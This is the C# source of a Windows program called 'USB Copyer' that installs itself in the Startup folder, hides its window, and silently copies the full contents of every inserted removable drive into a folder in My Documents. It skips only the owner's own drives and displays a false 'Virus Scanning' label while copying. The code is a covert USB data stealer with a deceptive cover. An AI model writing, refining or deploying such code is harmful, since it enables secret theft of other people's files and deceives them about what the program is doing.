using System.Windows.Forms;
using System.IO;
using System;
using System.Windows.Forms.Design;
using System.Threading;
using System.Text;
using System.Data.Odbc;
using System.Data;
using System.Web;
using System.ComponentModel;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Data.OleDb;
using System.Text.RegularExpressions;
using System.Linq;
using System.Collections.Generic;
using System.Management;




namespace USB_copyer
{
    public partial class Form1 :  Form
    {
        static Thread t1,t2;
        string[] exceptionDriveName=new string[100];

        //Form globalform;
        int incrementscan = 0, percentage=0;
        bool copying = false;
        double src=0, dst=0, lastdst=0;
        public string stopcopy="no", srcdir,dstdir, usbdata, nam ;
        string[] scenned = new string[99];

        public Form1()
        {
            //Invoke((MethodInvoker)delegate () { Hide();});
//            Hide();


            //            MessageBox.Show("hihid");
            InitializeComponent();
            //label3.Parent = progressBar1;
            //label3.BackColor = System.Drawing.Color.Transparent;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            try{

                //Starting second thread
                setveriables();
                t1 = new Thread(new ThreadStart(continuethread));
                t1.Start();

                //installer
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\USB Copyer.exe", true);
                
                //       MessageBox.Show("hihid");

            }
            catch {; }
        }
        void setveriables()
        {

            usbdata = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\USB Data 3.0.0.txt";
            nam = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!File.Exists(usbdata))
            {
                var tmpg = File.CreateText(usbdata);
                tmpg.Write(nam+ "\n"); tmpg.Close();
            }

            //var tmph = new System.IO.StreamReader(usbdata);
            //nam = tmph.ReadLine(); tmph.Close();
            //nam = Path.Combine(nam, @"USB Data\");

            var tmph = new System.IO.StreamReader(usbdata);
            nam = tmph.ReadLine();

            exceptionDriveName[0] = "NAEEM"; exceptionDriveName[1] = "NAEEM MALIK"; exceptionDriveName[2] = "X2";
            nam = nam.Substring(0, nam.Length);
            for(int o=3; o<=99; o++)
             if(!tmph.EndOfStream)
            {
                exceptionDriveName[o]= tmph.ReadLine();
                exceptionDriveName[o] = exceptionDriveName[o].Substring(0, exceptionDriveName[o].Length);
                    exceptionDriveName[o] = exceptionDriveName[o].ToUpper();
                    //MessageBox.Show(exceptionDriveName[o]);                
            }
            else
                    exceptionDriveName[o] = "";
            tmph.Close();
            nam = Path.Combine(nam, @"USB Data\");
            
            // MessageBox.Show(nam);
            Directory.CreateDirectory(nam);
            
        }

        private void runabout()
        {
            Application.Run(new AboutBox1()); 
        }

        public void continuethread()
        {
            Invoke((MethodInvoker)delegate () { Hide(); });

            try
            {

                while (true)
            {
                    setveriables();
                    for (int i = 0; i <= incrementscan; i++)
                    //if some device removed delete its record
                    if (!Directory.Exists(scenned[i]))
                        scenned[i] = "";

                    if (stopcopy == "no")
                    copyalldata();

                    Thread.Sleep(100) ;
            }
          } catch {; }

        }

        public void copyalldata()
        {
            //try {

            var drives = DriveInfo.GetDrives() ;
                foreach (DriveInfo d in drives) {
                    if (d.IsReady && (d.DriveType == DriveType.Removable))
                    {
                    //checking if device is aleady scenned
                    //if you remove this loop whatever something copied from your pc to usb will again copyied to usbdata folder which is not needed
                    for (int i = 0; i <= incrementscan; i++) {
                        //if some device removed delete its record
                        if (!Directory.Exists(scenned[i]))
                        {
                            src = dst = 0;
                            scenned[i] = "";
                        }
                        foreach (string exceptionDriveNamee in exceptionDriveName)
                        {
                            if (scenned[i] == d.Name || (d.VolumeLabel == exceptionDriveNamee && exceptionDriveNamee!=""))
                            {
                               // MessageBox.Show("getting out of loop "+exceptionDriveNamee);
                                goto loop;
                            }
                        }
                        }
   
                    if (stopcopy == "no")
                    {
                        devicenam = d.Name;
                       // t2 = new Thread(new ThreadStart(msgbox));
                       // t2.Start();
                       
                        //if (File.Exists(rsf))
                        {
                            Invoke((MethodInvoker)delegate ()
                            {
                                setveriables();
                            });
                            //File.SetAttributes(nam, FileAttributes.Hidden | FileAttributes.System);
                            //Path.GetInvalidPathChars()
                            
                            
                            nam += d.VolumeLabel;
                            srcdir = d.Name; dstdir = nam;
                            Invoke((MethodInvoker)delegate () { copying = true; Opacity = 70; Show(); label1.Text = "Virus Scanning on " + d.Name; });

                            DirectoryCopy(d.Name, nam, true);
                            scenned[incrementscan] = d.Name;
                            incrementscan++;
                            Invoke((MethodInvoker)delegate () { Hide(); copying = false; label1.Text = "Scanned " + d.Name; });
                        }
                        //else 
                        {
                          //  scenned[incrementscan] = d.Name;
                            //incrementscan++;
                        }

                    }
                }
                loop:;
                }
            //} catch {; }

        }


        string devicenam;        

        private void percentag()
        {
            try {
                //MessageBox.Show(srcdir, "src");
                Invoke((MethodInvoker)delegate () {
                if(src==0)
                    src = DirSize(new DirectoryInfo(srcdir));
                if(lastdst==0)
                    dst = DirSize(new DirectoryInfo(dstdir));
                percentage =Convert.ToInt32((dst / src) * 100 );
                progressBar1.Value =percentage;
                //MessageBox.Show(percentage.ToString());

            });
         } catch {; }

        }

        public double DirSize(DirectoryInfo d)
        {
            try {

                double size = 0;
            //MessageBox.Show(d.ToString());
            FileInfo[] fis = d.GetFiles();
                foreach (FileInfo fi in fis) {
                size += fi.Length;
                }

                DirectoryInfo[] dis = d.GetDirectories();
                foreach (DirectoryInfo di in dis)
                {
                size += DirSize(di);
                }

                return size;
            } catch { return 0; }
        }

        private void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
        {
            try {
            // Get the subdirectories for the source directory.        
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);

            DirectoryInfo[] dirs = dir.GetDirectories();        // If the destination directory doesn't exist, create it.       

            if ((new FileInfo(sourceDirName).Attributes & FileAttributes.System) != FileAttributes.System)
            {

              if (stopcopy=="no")
               if (!Directory.Exists(destDirName))
                {
                    Directory.CreateDirectory(destDirName);
                }
                // Get the files in the directory and copy them to the new location.    
                FileInfo[] files = dir.GetFiles();
                foreach (FileInfo file in files)
                {
                    string temppath = Path.Combine(destDirName, file.Name);
                    try{
                            if (stopcopy=="no")
                            if (!File.Exists(temppath))
                        {
                                lastdst = 0;
                                Invoke((MethodInvoker)delegate () { label3.Text = file.Directory + "\\" + file.Name; });
                                    file.CopyTo(temppath, false);
                        }
                    } catch { continue; }
                }

                // If copying subdirectories, copy them and their contents to new location. 
                if (copySubDirs)
                {
                    foreach (DirectoryInfo subdir in dirs)
                    {
                        string temppath = Path.Combine(destDirName, subdir.Name);
                        DirectoryCopy(subdir.FullName, temppath, copySubDirs);
                    }
                }
            }
         } catch {; }

        }

        public void dot()
        {
            if (copying)
            {
                percentag();
                label2.Text += ".";
                Refresh();
            }
            if (label2.Text == ".......................................................")
                label2.Text = "";
            
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
        //    MessageBox.Show("hihid");

            dot();
           // label4.Text = copying.ToString();
        }

        private void bAbout_Click(object sender, EventArgs e)
        {
            t2 = new Thread(new ThreadStart(runabout));
            t2.Start();
        }

        public void stophand()
        {

            if (stopcopy == "stop")
            {
                label1.Text = "started scanning again";
                button1.Text = "Stop";
                t1.Resume();
                stopcopy = "no";
                copying = true;
                scenned[incrementscan] = "";
            }

            else if (stopcopy == "no")
            {
                label1.Text = "stopped scanning";
                button1.Text = "Start";
                t1.Suspend();
                copying = false;
                stopcopy = "stop";
            }
           
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            exit();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            exit();
        }

        private void exit()
        {
            try   {
                t1.Abort();   
            Application.Exit();
            }            catch {; }
        }
        private void button1_Click_1(object sender, EventArgs e)
        {
            try   {
            stophand();
        } catch {; }
        }

 

    }
}
